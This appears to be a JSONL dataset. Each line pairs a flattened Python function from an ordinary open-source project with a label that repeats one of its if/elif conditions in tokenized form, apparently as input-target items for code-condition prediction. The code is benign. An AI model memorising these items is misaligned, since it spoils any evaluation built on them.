{"input": "def check_dimensions(nrow, ncol): if nrow is not None: if nrow < 1: warn( \"'nrow' must be greater than 0. \" \"Your value has been ignored.\", PlotnineWarning, ) nrow = None else: nrow = int(nrow) if ncol is not None: if ncol < 1: warn( \"'ncol' must be greater than 0. \" \"Your value has been ignored.\", PlotnineWarning, ) ncol = None else: ncol = int(ncol) return nrow, ncol", "label": "if nrow < 1 :"}
{"input": "def logic(): while 1: yield clock.posedge, reset.negedge if reset == ACTIVE_LOW: count.next = 0 else: if enable: if count == -n: count.next = n - 1 else: count.next = count - 1", "label": "if count == - n :"}
{"input": "def get_whitelist(self, guild: Optional[discord.Guild] = None) -> Set[int]: async with self._access_lock: ret: Set[int] gid: Optional[int] = guild.id if guild else None if gid in self._cached_whitelist: ret = self._cached_whitelist[gid].copy() else: if gid is not None: ret = set(await self._config.guild_from_id(gid).whitelist()) else: ret = set(await self._config.whitelist()) self._cached_whitelist[gid] = ret.copy() return ret", "label": "if gid in self . _cached_whitelist :"}
{"input": "def process_response(self, request, response): if getattr(self, \"has_session\", False): if getattr(request, \"user\", None) and request.user.is_authenticated(): user = \"%s (id:%s)\" % (request.user.username, request.user.pk) else: user = \"(Anonymous)\" self.logger.info( \"Session %s authenticated by %s\", request.session.session_key, user ) request.session.save = self._save self._save = None self.session = None self.has_session = False", "label": "if getattr ( request , \"user\" , None ) and request . user . is_authenticated ( ) :"}
{"input": "def cluster(spawnpoints, radius, time_threshold): clusters = [] diameter = 2 * radius for p in spawnpoints: if len(clusters) == 0: clusters.append(Spawncluster(p)) else: c = min(clusters, key=lambda x: cost(p, x, time_threshold)) if check_cluster(p, c, radius, time_threshold): c.append(p) else: c = Spawncluster(p) clusters.append(c) return clusters", "label": "if check_cluster ( p , c , radius , time_threshold ) :"}
{"input": "def get_shape(shape): \"\"\"Convert the shape to correct dtype and vars.\"\"\" ret = [] for dim in shape: if isinstance(dim, tvm.tir.IntImm): if libinfo()[\"INDEX_DEFAULT_I64\"] == \"ON\": ret.append(dim) else: val = int(dim) assert val <= np.iinfo(np.int32).max ret.append(tvm.tir.IntImm(\"int32\", val)) elif isinstance(dim, tvm.tir.Any): ret.append(te.var(\"any_dim\", \"int32\")) else: ret.append(dim) return ret", "label": "if isinstance ( dim , tvm . tir . IntImm ) :"}
{"input": "def run(self): queue = self.queue while True: if not self.running: break # Grab our data callback, requests, fetchTimeout, validityOverride = queue.get() # Grab prices, this is the time-consuming part if len(requests) > 0: Price.fetchPrices(requests, fetchTimeout, validityOverride) wx.CallAfter(callback) queue.task_done() # After we fetch prices, go through the list of waiting items and call their callbacks for price in requests: callbacks = self.wait.pop(price.typeID, None) if callbacks: for callback in callbacks: wx.CallAfter(callback)", "label": "if callbacks :"}
{"input": "def _load_scopes_(self): if self._model_ is None: tablemap = self.db._adapter.tables(self.query) if len(tablemap) == 1: self._model_ = tablemap.popitem()[1]._model_ if self._model_: self._scopes_ = self._model_._instance_()._scopes_", "label": "if len ( tablemap ) == 1 :"}
{"input": "def udp_to_tcp(udp_sock, tcp_conn): while True: msg, _ = udp_sock.recvfrom(2 ** 16) log_msg(\"read_udp\", msg) if not msg: return write_tcp(tcp_conn, msg)", "label": "if not msg :"}
{"input": "def __get_annotations(self): if not hasattr(self, \"_annotations\"): self._annotations = _retrieve_annotations( self._adaptor, self._primary_id, self._taxon_id ) if self._identifier: self._annotations[\"gi\"] = self._identifier if self._division: self._annotations[\"data_file_division\"] = self._division return self._annotations", "label": "if self . _division :"}
{"input": "def ignore_module(module): result = False for check in ignore_these: if \"/*\" in check: if check[:-1] in module: result = True else: if (os.getcwd() + \"/\" + check + \".py\") == module: result = True if result: print_warning(\"Ignoring module: \" + module) return result", "label": "if \"/*\" in check :"}
{"input": "def find_commands(management_dir): # Modified version of function from django/core/management/__init__.py. command_dir = os.path.join(management_dir, \"commands\") commands = [] try: for f in os.listdir(command_dir): if f.startswith(\"_\"): continue elif f.endswith(\".py\") and f[:-3] not in commands: commands.append(f[:-3]) elif f.endswith(\".pyc\") and f[:-4] not in commands: commands.append(f[:-4]) except OSError: pass return commands", "label": "if f . startswith ( \"_\" ) :"}
{"input": "def _add_kid(key, x): if x is None: kids[key] = None else: if type(x) in (type([]), type(())): x1 = [i for i in x if isinstance(i, TVTKBase)] if x1: kids[key] = x1 elif isinstance(x, TVTKBase): if hasattr(x, \"__iter__\"): # Don't add iterable objects that contain non # acceptable nodes if len(list(x)) and isinstance(list(x)[0], TVTKBase): kids[key] = x else: kids[key] = x", "label": "if type ( x ) in ( type ( [ ] ) , type ( ( ) ) ) :"}
{"input": "def classify(self, url, text): for match in self.rules.match(data=text): if (url, match) in self.matches: continue self.matches.append((url, match)) if self.discard_url_match(url, match): # pragma: no cover continue self.handle_match_etags(match) rule = match.rule meta = match.meta tags = \",\".join([\" \".join(t.split(\"_\")) for t in match.tags]) log.ThugLogging.log_classifier(\"text\", url, rule, tags, meta) for c in self.custom_classifiers: self.custom_classifiers[c](url, text)", "label": "if ( url , match ) in self . matches :"}
{"input": "def recurse(node): for child in node.childNodes: if child.nodeType != child.ELEMENT_NODE: continue if child.nodeName.upper() == \"H1\": return child if child not in visited: return recurse(child)", "label": "if child . nodeType != child . ELEMENT_NODE :"}
{"input": "def try_fix_ip_range(self): for i in range(len(self.fake_ip_parts)): if self.fake_ip_parts[i] > 256: if i - 1 < 0: raise Exception(\"Fake IP's out of range.\") self.fake_ip_parts[i - 1] += 1 self.fake_ip_parts[i] = 1", "label": "if self . fake_ip_parts [ i ] > 256 :"}
{"input": "def run(self): self.thread.start() while self.thread.isRunning(): if config.imager_percentage: self.update.emit(config.imager_percentage) if not self.thread.isFinished() and config.percentage == 100: config.imager_status_text = \"\" self.status.emit(\"Please wait...\") time.sleep(0.1) self.update.emit(100) self.update.emit(0) if self.thread.isFinished(): config.status_text = \"\" self.finished.emit() return", "label": "if config . imager_percentage :"}
{"input": "def _get_trading_minutes(self, trading_date): trading_minutes = set() for account_type in self._config.base.accounts: if account_type == DEFAULT_ACCOUNT_TYPE.STOCK: trading_minutes = trading_minutes.union( self._get_stock_trading_minutes(trading_date) ) elif account_type == DEFAULT_ACCOUNT_TYPE.FUTURE: trading_minutes = trading_minutes.union( self._get_future_trading_minutes(trading_date) ) return sorted(list(trading_minutes))", "label": "if account_type == DEFAULT_ACCOUNT_TYPE . STOCK :"}
{"input": "def lngettext(self, msgid1, msgid2, n): import warnings warnings.warn( \"lngettext() is deprecated, use ngettext() instead\", DeprecationWarning, 2 ) try: tmsg = self._catalog[(msgid1, self.plural(n))] except KeyError: if self._fallback: return self._fallback.lngettext(msgid1, msgid2, n) if n == 1: tmsg = msgid1 else: tmsg = msgid2 if self._output_charset: return tmsg.encode(self._output_charset) return tmsg.encode(locale.getpreferredencoding())", "label": "if n == 1 :"}
{"input": "def check_langs(langs, pairs): messages = [] for src, tgt in pairs: if src not in langs or tgt not in langs: messages.append( f\"language pair {src}-{tgt} contains languages \" \"that are not in the language dictionary\" ) if len(messages) > 0: raise ValueError(\" \".join(messages) + f\"; langs: {langs}\")", "label": "if src not in langs or tgt not in langs :"}
{"input": "def to_header(self): \"\"\"Converts the object back into an HTTP header.\"\"\" ranges = [] for begin, end in self.ranges: if end is None: ranges.append(f\"{begin}-\" if begin >= 0 else str(begin)) else: ranges.append(f\"{begin}-{end - 1}\") return f\"{self.units}={','.join(ranges)}\"", "label": "if end is None :"}
{"input": "def name(ent, langpref=\"en\"): try: org = ent[\"organization\"] except KeyError: return None for info in [\"organization_display_name\", \"organization_name\", \"organization_url\"]: try: for item in org[info]: if item[\"lang\"] == langpref: return item[\"text\"] except KeyError: pass return None", "label": "if item [ \"lang\" ] == langpref :"}
{"input": "def check_url(value): validate(text, value) parsed = urlparse(value) if not parsed.netloc: raise ValueError(\"'{0}' is not a valid URL\".format(value)) for name, schema in attributes.items(): if not _hasattr(parsed, name): raise ValueError(\"Invalid URL attribute '{0}'\".format(name)) try: validate(schema, _getattr(parsed, name)) except ValueError as err: raise ValueError( \"Unable to validate URL attribute '{0}': {1}\".format(name, err) ) return True", "label": "if not _hasattr ( parsed , name ) :"}
{"input": "def stepStarted(self, step): self.currentStep = step for w in self.watchers: receiver = w.stepStarted(self, step) if receiver: if isinstance(receiver, type(())): step.subscribe(receiver[0], receiver[1]) else: step.subscribe(receiver) d = step.waitUntilFinished() # TODO: This actually looks like a bug, but this code # will be removed anyway. # pylint: disable=cell-var-from-loop d.addCallback(lambda step: step.unsubscribe(receiver)) step.waitUntilFinished().addCallback(self._stepFinished)", "label": "if receiver :"}
{"input": "def assert_not_none(obj, msg=None, values=True): \"\"\"Fail the test if given object is None.\"\"\" _msg = \"is None\" if obj is None: if msg is None: msg = _msg elif values is True: msg = \"%s: %s\" % (msg, _msg) _report_failure(msg)", "label": "if msg is None :"}
{"input": "def _parse_date_fmt(): fmt = get_format(\"DATE_FORMAT\") escaped = False for char in fmt: if escaped: escaped = False elif char == \"\\\\\": escaped = True elif char in \"Yy\": yield \"year\" elif char in \"bEFMmNn\": yield \"month\" elif char in \"dj\": yield \"day\"", "label": "elif char == \"\\\\\" :"}
{"input": "def GetPluginClass(self): if self.plugin_name: plugin_cls = registry.OutputPluginRegistry.PluginClassByName(self.plugin_name) if plugin_cls is None: logging.warning(\"Unknown output plugin %s\", self.plugin_name) return registry.OutputPluginRegistry.PluginClassByName( \"UnknownOutputPlugin\" ) return plugin_cls", "label": "if plugin_cls is None :"}
{"input": "def command(self): config = self.session.config unregister = False self.session.ui.notify(_(\"Watching logs: Press CTRL-C to return to the CLI\")) try: while not mailpile.util.QUITTING and not config.event_log: time.sleep(1) unregister = config.event_log and config.event_log.ui_watch(self.session.ui) self.session.ui.unblock(force=True) while not mailpile.util.QUITTING: time.sleep(1) except KeyboardInterrupt: pass finally: if unregister: config.event_log.ui_unwatch(self.session.ui) return self._success(_(\"That was fun!\"))", "label": "if unregister :"}
{"input": "def delete_rule(self, arn): for load_balancer_arn in self.load_balancers: listeners = self.load_balancers.get(load_balancer_arn).listeners.values() for listener in listeners: for rule in listener.rules: if rule.arn == arn: listener.remove_rule(rule) return", "label": "if rule . arn == arn :"}
{"input": "def __dragBegin(self, widget, event): if event.buttons & (event.Buttons.Left | event.Buttons.Middle): GafferUI.Pointer.setCurrent(\"nodes\") if len(self.__graphComponents) == 1: return next(iter(self.__graphComponents)) else: return Gaffer.StandardSet(self.__graphComponents) return None", "label": "if len ( self . __graphComponents ) == 1 :"}
{"input": "def _get_strategy_name(self): frame = sys._getframe() while frame: st = frame.f_locals.get(\"self\") if isinstance(st, StrategyBase): return \"%s.%s\" % (type(st).__module__, type(st).__name__) frame = frame.f_back return \"\"", "label": "if isinstance ( st , StrategyBase ) :"}
{"input": "def getCommitFromFile(short=True): global _gitdir branch = getBranchFromFile() commit = None if _gitdir and branch: if branch == \"HEAD\": commitFile = os.path.join(_gitdir, \"HEAD\") else: commitFile = os.path.join(_gitdir, \"refs\", \"heads\", branch) if os.path.isfile(commitFile): with open(commitFile, \"r\", encoding=\"utf-8\") as f: commit = f.readline().strip() if short and commit: return commit[:8] else: return commit", "label": "if os . path . isfile ( commitFile ) :"}
{"input": "def _register_aliases_from_pack(self, pack, aliases): registered_count = 0 for alias in aliases: try: LOG.debug(\"Loading alias from %s.\", alias) self._register_action_alias(pack, alias) except Exception as e: if self._fail_on_failure: msg = 'Failed to register alias \"%s\" from pack \"%s\": %s' % ( alias, pack, str(e), ) raise ValueError(msg) LOG.exception(\"Unable to register alias: %s\", alias) continue else: registered_count += 1 return registered_count", "label": "if self . _fail_on_failure :"}
{"input": "def pop_many(self, limit=None): if limit is None: limit = DEFAULT_SYNC_OFFLINE_ACTIVITY heartbeats = [] count = 0 while count < limit: heartbeat = self.pop() if not heartbeat: break heartbeats.append(heartbeat) count += 1 if count % HEARTBEATS_PER_REQUEST == 0: yield heartbeats heartbeats = [] if heartbeats: yield heartbeats", "label": "if not heartbeat :"}
{"input": "def makeChunkVertices(self, chunk): if ( chunk.root_tag and \"Level\" in chunk.root_tag and \"TileTicks\" in chunk.root_tag[\"Level\"] ): ticks = chunk.root_tag[\"Level\"][\"TileTicks\"] if len(ticks): self.vertexArrays.append( self._computeVertices( [[t[i].value for i in \"xyz\"] for t in ticks], (0xFF, 0xFF, 0xFF, 0x44), chunkPosition=chunk.chunkPosition, ) ) yield", "label": "if len ( ticks ) :"}
{"input": "def read_bytes_from_url(url: str, optional=False) -> bytes: if parse_args().print_commands: print_stderr(color_line(\"=> \", 14) + f\"GET {url}\") req = request.Request(url) try: response = request.urlopen(req) except URLError as exc: print_error(\"urllib: \" + str(exc.reason)) if optional: return b\"\" if ask_to_continue(_(\"Do you want to retry?\")): return read_bytes_from_url(url, optional=optional) raise SysExit(102) result_bytes = response.read() return result_bytes", "label": "if optional :"}
{"input": "def h2i(self, pkt, x): if x is not None: if x <= -180.00000005: warning(\"Fixed3_7: Input value too negative: %.8f\" % x) x = -180.0 elif x >= 180.00000005: warning(\"Fixed3_7: Input value too positive: %.8f\" % x) x = 180.0 x = int(round((x + 180.0) * 1e7)) return x", "label": "elif x >= 180.00000005 :"}
{"input": "def replace_incompatible_files(): for filename, version_info in PYTHON_VERSION_REQUIREMENTS.items(): if sys.version_info >= version_info: continue version = \".\".join(str(v) for v in version_info) code = INCOMPATIBLE_PYTHON_VERSION_PLACEHOLDER.format(version=version) with open(filename, \"w\") as f: f.write(code)", "label": "if sys . version_info >= version_info :"}
{"input": "def __eq__(self, other): if self.__class__ != other.__class__: return False for attr in [\"bar\", \"baz\", \"quux\"]: if hasattr(self, attr) != hasattr(other, attr): return False elif getattr(self, attr, None) != getattr(other, attr, None): return False return True", "label": "if hasattr ( self , attr ) != hasattr ( other , attr ) :"}
{"input": "def get_content_length(download): try: meta = download.info() if hasattr(meta, \"getheaders\") and hasattr(meta.getheaders, \"Content-Length\"): return int(meta.getheaders(\"Content-Length\")[0]) elif hasattr(download, \"getheader\") and download.getheader(\"Content-Length\"): return int(download.getheader(\"Content-Length\")) elif hasattr(meta, \"getheader\") and meta.getheader(\"Content-Length\"): return int(meta.getheader(\"Content-Length\")) except Exception: pass return 0", "label": "elif hasattr ( meta , \"getheader\" ) and meta . getheader ( \"Content-Length\" ) :"}
{"input": "def set_size(self, size): assert len(size) == 2 width, height = size if width == -1: for button in self._buttons_list: cur_width = button.GetSize()[self.WIDTH] if cur_width > width: width = cur_width if height == -1: for button in self._buttons_list: cur_height = button.GetSize()[self.HEIGHT] if cur_height > height: height = cur_height if self._squared: width = height = width if width > height else height for button in self._buttons_list: button.SetMinSize((width, height))", "label": "if cur_width > width :"}
{"input": "def _default_config(self): if sys.platform.startswith(\"win\"): return {\"name\": \"Command Prompt\", \"cmd\": \"cmd.exe\", \"env\": {}} else: if \"SHELL\" in os.environ: shell = os.environ[\"SHELL\"] if os.path.basename(shell) == \"tcsh\": cmd = [shell, \"-l\"] else: cmd = [shell, \"-i\", \"-l\"] else: cmd = [\"/bin/bash\", \"-i\", \"-l\"] return {\"name\": \"Login Shell\", \"cmd\": cmd, \"env\": {}}", "label": "if os . path . basename ( shell ) == \"tcsh\" :"}
{"input": "def log_sock(s, event_type=None): if sock_silent: pass else: if event_type is None: logsocket.sendto(ensure_str(s), (host, port)) elif event_type in show_event: logsocket.sendto(ensure_str(s), (host, port)) else: pass", "label": "elif event_type in show_event :"}
{"input": "def check_eventref_citations(self, obj): if obj: for event_ref in obj.get_event_ref_list(): if self.check_attribute_citations(event_ref): return True event = self.dbstate.db.get_event_from_handle(event_ref.ref) if self.check_event_citations(event): return True return False", "label": "if self . check_attribute_citations ( event_ref ) :"}
{"input": "def __exit__(self, exc_type, exc_value, traceback): self.nest -= 1 if self.nest == 0: try: self.con.__exit__(exc_type, exc_value, traceback) self.close() except Exception as exc: if self.debug: self.debug.write(\"EXCEPTION from __exit__: {}\".format(exc)) raise", "label": "if self . debug :"}
{"input": "def construct_instances(self, row, keys=None): collected_models = {} for i, (key, constructor, attr, conv) in enumerate(self.column_map): if keys is not None and key not in keys: continue value = row[i] if key not in collected_models: collected_models[key] = constructor() instance = collected_models[key] if attr is None: attr = self.cursor.description[i][0] if conv is not None: value = conv(value) setattr(instance, attr, value) return collected_models", "label": "if key not in collected_models :"}
{"input": "def delete(self): \"\"\"Completely shut down pulseaudio client.\"\"\" if self._pa_context is not None: assert _debug(\"PulseAudioContext.delete\") if self.is_ready: pa.pa_context_disconnect(self._pa_context) while self.state is not None and not self.is_terminated: self.wait() self._disconnect_callbacks() pa.pa_context_unref(self._pa_context) self._pa_context = None", "label": "if self . is_ready :"}
{"input": "def _hstack(self, other, prefix=None): \"\"\"Join the columns of the other DataFrame to this one, assuming the ordering is the same\"\"\" assert len(self) == len( other ), \"does not make sense to horizontally stack DataFrames with different lengths\" for name in other.get_column_names(): if prefix: new_name = prefix + name else: new_name = name self.add_column(new_name, other.columns[name])", "label": "if prefix :"}
{"input": "def smart_linkflags(source, target, env, for_signature): if cplusplus.iscplusplus(source): build_dir = env.subst(\"$BUILDDIR\", target=target, source=source) if build_dir: return \"-qtempinc=\" + os.path.join(build_dir, \"tempinc\") return \"\"", "label": "if build_dir :"}
{"input": "def read(self, size): x = len(self.buf) while x < size: raw = self.fileobj.read(self.blocksize) if not raw: break data = self.bz2obj.decompress(raw) self.buf += data x += len(data) buf = self.buf[:size] self.buf = self.buf[size:] self.pos += len(buf) return buf", "label": "if not raw :"}
{"input": "def set_ok_verifiability(self, cookie, request): if request.unverifiable and is_third_party(request): if cookie.version > 0 and self.strict_rfc2965_unverifiable: _debug(\" third-party RFC 2965 cookie during \" \"unverifiable transaction\") return False elif cookie.version == 0 and self.strict_ns_unverifiable: _debug(\" third-party Netscape cookie during \" \"unverifiable transaction\") return False return True", "label": "elif cookie . version == 0 and self . strict_ns_unverifiable :"}
{"input": "def update_sockets(self, context): bools = [self.min_list, self.max_list, self.size_list] dims = int(self.dimensions[0]) for i in range(3): for j in range(3): out_index = 4 + j + 3 * i hidden = self.outputs[out_index].hide_safe if bools[i][j] and j < dims: if hidden: self.outputs[out_index].hide_safe = False else: self.outputs[out_index].hide_safe = True updateNode(self, context)", "label": "if bools [ i ] [ j ] and j < dims :"}
{"input": "def hash_of_file(path): \"\"\"Return the hash of a downloaded file.\"\"\" with open(path, \"r\") as archive: sha = sha256() while True: data = archive.read(2 ** 20) if not data: break sha.update(data) return encoded_hash(sha)", "label": "if not data :"}
{"input": "def _compute_early_outs(self, quotas): for q in quotas: if q.closed and not self._ignore_closed: self.results[q] = Quota.AVAILABILITY_ORDERED, 0 elif q.size is None: self.results[q] = Quota.AVAILABILITY_OK, None elif q.size == 0: self.results[q] = Quota.AVAILABILITY_GONE, 0", "label": "elif q . size == 0 :"}
{"input": "def providers_for_config_string(config_string, netcode): providers = [] for d in config_string.split(): p = provider_for_descriptor_and_netcode(d, netcode) if p: providers.append(p) else: warnings.warn(\"can't parse provider %s in config string\" % d) return providers", "label": "if p :"}
{"input": "def _get_plugin_value(self, feature, actor): for plugin in plugins.all(version=2): handlers = safe_execute(plugin.get_feature_hooks, _with_transaction=False) for handler in handlers or (): rv = handler(feature, actor) if rv is not None: return rv return None", "label": "if rv is not None :"}
{"input": "def test_digit_numeric_consistent(self): # Test that digit and numeric are consistent, # i.e. if a character has a digit value, # its numeric value should be the same. count = 0 for i in xrange(0x10000): c = unichr(i) dec = self.db.digit(c, -1) if dec != -1: self.assertEqual(dec, self.db.numeric(c)) count += 1 self.assertTrue(count >= 10) # should have tested at least the ASCII digits", "label": "if dec != - 1 :"}
{"input": "def call(command, title, retry): \"\"\"Run a command-line program and display the result.\"\"\" if Options.rerun_args: command, title, retry = Options.rerun_args Options.rerun_args = None success = call(command, title, retry) if not success: return False print(\"\") print(\"$ %s\" % \" \".join(command)) failure = subprocess.call(command) if failure and retry: Options.rerun_args = command, title, retry return not failure", "label": "if not success :"}
{"input": "def handle_custom_actions(self): for _, action in CustomAction.registry.items(): if action.resource != self.resource: continue if action.action not in self.parser.choices: self.parser.add_parser(action.action, help=\"\") action(self.page).add_arguments(self.parser, self)", "label": "if action . resource != self . resource :"}
{"input": "def __init__(self, user, *args, **kwargs): self.user = user super(AccountSettingsForm, self).__init__(*args, **kwargs) if self.user.is_managed: # username and password always managed, email and # name optionally managed for field in (\"email\", \"name\", \"username\"): if field == \"username\" or field in settings.SENTRY_MANAGED_USER_FIELDS: self.fields[field] = ReadOnlyTextField(label=self.fields[field].label) # don't show password field at all del self.fields[\"new_password\"] # don't show username field if its the same as their email address if self.user.email == self.user.username: del self.fields[\"username\"]", "label": "if field == \"username\" or field in settings . SENTRY_MANAGED_USER_FIELDS :"}
{"input": "def eval(self, code, eval=True, raw=False): self._engine._append_source(code) try: result = self._context.eval(code) except quickjs.JSException as e: raise ProgramError(*e.args) else: if eval: if raw or not isinstance(result, quickjs.Object): return result elif callable(result) and self.typeof(result) == u\"function\": return self.Function(self, result) else: return json.loads(result.json())", "label": "if eval :"}
{"input": "def get_def_offsets(self, defloc): \"\"\"Get the byte offsets for a definition.\"\"\" defn = self.defs[defloc.def_id] typ = defn.typ if typ == \"Attribute\": start, end = self._get_attr_bounds(defn.name, defloc.location) else: start = self.source.get_offset(defloc.location) if typ in DEF_OFFSETS: start += DEF_OFFSETS[typ] end = start + len(defn.name) return (start, end)", "label": "if typ in DEF_OFFSETS :"}
{"input": "def RemoveRefCountOutput(data): while 1: last_line_pos = data.rfind(\"\\n\") if not re.match(\"\\[\\d+ refs\\]\", data[last_line_pos + 1 :]): break if last_line_pos < 0: # All the output return \"\" data = data[:last_line_pos] return data", "label": "if last_line_pos < 0 :"}
{"input": "def traverse_before_reduce(operator): \"\"\"Internal traverse function\"\"\" if isinstance(operator, tvm.te.PlaceholderOp): return if tag.is_injective(operator.tag): sch[operator].compute_inline() for tensor in operator.input_tensors: if tensor.op not in scheduled_ops: traverse_before_reduce(tensor.op) else: raise RuntimeError(\"Unsupported operator: %s\" % operator.tag) scheduled_ops.append(operator)", "label": "if tensor . op not in scheduled_ops :"}
{"input": "def _get_config(key): config = db.session.execute( Configs.__table__.select().where(Configs.key == key) ).fetchone() if config and config.value: value = config.value if value and value.isdigit(): return int(value) elif value and isinstance(value, string_types): if value.lower() == \"true\": return True elif value.lower() == \"false\": return False else: return value # Flask-Caching is unable to roundtrip a value of None. # Return an exception so that we can still cache and avoid the db hit return KeyError", "label": "if value . lower ( ) == \"true\" :"}
{"input": "def find_executable(names): # Given a list of executable names, find the first one that is available # as an executable file, on the path. for name in names: fpath, fname = os.path.split(name) if fpath: # The given name is absolute. if is_executable(name): return name else: # Try to find the name on the PATH for path in os.environ[\"PATH\"].split(os.pathsep): exe_file = os.path.join(path, name) if is_executable(exe_file): return exe_file # Could not find it :( return None", "label": "if is_executable ( name ) :"}
{"input": "def push(self): advice = self.check() if not self._context[\"silent\"]: if not self.hasPendingSync(advice): print(\"No changes to push.\") return choice = input(\"Continue? y/N:\") if choice != \"y\": print(\"Aborted on user command\") return print(\"push local changes to remote...\") self._publish.syncRemote(self._context[\"srcroot\"], advice)", "label": "if not self . hasPendingSync ( advice ) :"}
{"input": "def __init__(self, itemtype, cnf={}, *, master=None, **kw): if not master: if \"refwindow\" in kw: master = kw[\"refwindow\"] elif \"refwindow\" in cnf: master = cnf[\"refwindow\"] else: master = tkinter._default_root if not master: raise RuntimeError( \"Too early to create display style: \" \"no root window\" ) self.tk = master.tk self.stylename = self.tk.call(\"tixDisplayStyle\", itemtype, *self._options(cnf, kw))", "label": "if \"refwindow\" in kw :"}
{"input": "def __call__(self, x, **kwargs): h = x for layer, argnames, accept_var_args in zip( self.layers, self.argnames, self.accept_var_args ): if accept_var_args: layer_kwargs = kwargs else: layer_kwargs = {k: v for k, v in kwargs.items() if k in argnames} h = layer(h, **layer_kwargs) return h", "label": "if accept_var_args :"}
{"input": "def run_train_loop(self): self.begin_training() for _ in self.yield_train_step(): if self.should_save_model(): self.save_model() if self.should_save_checkpoint(): self.save_checkpoint() if self.should_eval_model(): self.eval_model() if self.should_break_training(): break self.eval_model() self.done_training() return self.returned_result()", "label": "if self . should_save_checkpoint ( ) :"}
{"input": "def configure_callback(conf): \"\"\"Received configuration information\"\"\" global ZK_HOSTS for node in conf.children: if node.key == \"Hosts\": ZK_HOSTS = node.values[0].split(\",\") else: collectd.warning(\"zookeeper plugin: Unknown config key: %s.\" % node.key) log(\"Configured with hosts=%s\" % (ZK_HOSTS))", "label": "if node . key == \"Hosts\" :"}
{"input": "def inner(self, *args, **kwargs): \"\"\"Inner.\"\"\" if not is_internet_available(): LOGGER.debug(\"\\n\\n%s\", func.__name__) LOGGER.debug(\"============================\") if func.__doc__: LOGGER.debug('\"\"\" %s \"\"\"', func.__doc__.strip()) LOGGER.debug(\"----------------------------\") LOGGER.debug(\"Skipping because no Internet connection available.\") LOGGER.debug(\"\\n++++++++++++++++++++++++++++\") return None result = func(self, *args, **kwargs) return result", "label": "if func . __doc__ :"}
{"input": "def _shares_in_results(data): shares_in_device, shares_in_subdevice = False, False for plugin_name, plugin_result in data.iteritems(): if plugin_result[\"status\"] == \"error\": continue if \"device\" not in plugin_result: continue if \"disk_shares\" in plugin_result[\"device\"]: shares_in_device = True for subdevice in plugin_result[\"device\"].get(\"subdevices\", []): if \"disk_shares\" in subdevice: shares_in_subdevice = True break return shares_in_device, shares_in_subdevice", "label": "if \"disk_shares\" in plugin_result [ \"device\" ] :"}
{"input": "def register_auth_provider_blueprints(cls, app, prefix=\"/auth/login\"): app.auth_providers = [] for provider in app.config.get(\"AUTH_PROVIDERS\", [\"debug\", \"oauth\"]): if not isinstance(provider, KnowledgeAuthProvider): provider = cls._get_subclass_for(provider.lower())(name=provider, app=app) app.register_blueprint( provider.blueprint, url_prefix=\"/\".join((prefix, provider.name)) ) app.auth_providers.append(provider)", "label": "if not isinstance ( provider , KnowledgeAuthProvider ) :"}
{"input": "def getText(self, stuff): if isinstance(stuff, Fighter): active = [x.name for x in stuff.abilities if x.active] if len(active) == 0: return \"None\" return \", \".join(active)", "label": "if len ( active ) == 0 :"}
{"input": "def run(self, paths=[]): items = [] for item in SideBarSelection(paths).getSelectedItems(): if item.isUnderCurrentProject(): items.append(item.url(\"url_production\")) if len(items) > 0: sublime.set_clipboard(\"\\n\".join(items)) if len(items) > 1: sublime.status_message(\"Items URL copied\") else: sublime.status_message(\"Item URL copied\")", "label": "if len ( items ) > 1 :"}
{"input": "def read_boolean(file: BinaryIO, count: int, checkall: bool = False) -> List[bool]: if checkall: all_defined = file.read(1) if all_defined != unhexlify(\"00\"): return [True] * count result = [] b = 0 mask = 0 for i in range(count): if mask == 0: b = ord(file.read(1)) mask = 0x80 result.append(b & mask != 0) mask >>= 1 return result", "label": "if mask == 0 :"}
{"input": "def __prep_write_total(self, comments, main, fallback, single): lower = self.as_lowercased() for k in [main, fallback, single]: if k in comments: del comments[k] if single in lower: parts = lower[single].split(\"/\", 1) if parts[0]: comments[single] = [parts[0]] if len(parts) > 1: comments[main] = [parts[1]] if main in lower: comments[main] = lower.list(main) if fallback in lower: if main in comments: comments[fallback] = lower.list(fallback) else: comments[main] = lower.list(fallback)", "label": "if main in comments :"}
{"input": "def _filter_medias_not_commented(self, media_items): not_commented_medias = [] for media in media_items: if media.get(\"comment_count\", 0) > 0 and media.get(\"comments\"): my_comments = [ comment for comment in media[\"comments\"] if comment[\"user_id\"] == self.user_id ] if my_comments: continue not_commented_medias.append(media) return not_commented_medias", "label": "if comment [ \"user_id\" ] == self . user_id"}
{"input": "def run(url): import os for fpath in [ os.path.expanduser(\"~/Applications/zeal.app\"), \"/Applications/zeal.app\", ]: if os.path.exists(fpath + \"/Contents/MacOS/zeal\"): import subprocess, pipes pid = subprocess.Popen( [ fpath + \"/Contents/MacOS/zeal\", \"--query={0}\".format(pipes.quote(url)), ], stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE, ) return", "label": "if os . path . exists ( fpath + \"/Contents/MacOS/zeal\" ) :"}
{"input": "def get_input_info(exec_info, network): input_dict = collections.OrderedDict() for v in exec_info.data_variable: input_dict[v.variable_name] = [] for v in network.variable: if v.name in input_dict: shape = v.shape.dim input_dict[v.name] = [x if x > 0 else batch_size for x in shape] return input_dict", "label": "if v . name in input_dict :"}
{"input": "def _clean_text(self, text): \"\"\"Performs invalid character removal and whitespace cleanup on text.\"\"\" output = [] char_idx = [] for i, char in enumerate(text): cp = ord(char) if cp == 0 or cp == 0xFFFD or _is_control(char): continue if _is_whitespace(char): output.append(\" \") char_idx.append(i) else: output.append(char) char_idx.append(i) return \"\".join(output), char_idx", "label": "if _is_whitespace ( char ) :"}
{"input": "def AddVersion(version, ns, versionId=\"\", isLegacy=0, serviceNs=\"\"): if not ns: ns = serviceNs if version not in parentMap: nsMap[version] = ns if len(versionId) > 0: versionMap[ns + \"/\" + versionId] = version if isLegacy or ns is \"\": versionMap[ns] = version versionIdMap[version] = versionId if not serviceNs: serviceNs = ns serviceNsMap[version] = serviceNs parentMap[version] = set()", "label": "if isLegacy or ns is \"\" :"}
{"input": "def set_accessible_async(self, trans, id=None, accessible=False): \"\"\"Set workflow's importable attribute and slug.\"\"\" stored = self.get_stored_workflow(trans, id) # Only set if importable value would change; this prevents a change in the update_time unless attribute really changed. importable = accessible in [\"True\", \"true\", \"t\", \"T\"] if stored and stored.importable != importable: if importable: self._make_item_accessible(trans.sa_session, stored) else: stored.importable = importable trans.sa_session.flush() return", "label": "if importable :"}
{"input": "def update(self, val, n=1): if val is not None: self.val = val if n > 0: self.sum = type_as(self.sum, val) + (val * n) self.count = type_as(self.count, n) + n", "label": "if n > 0 :"}
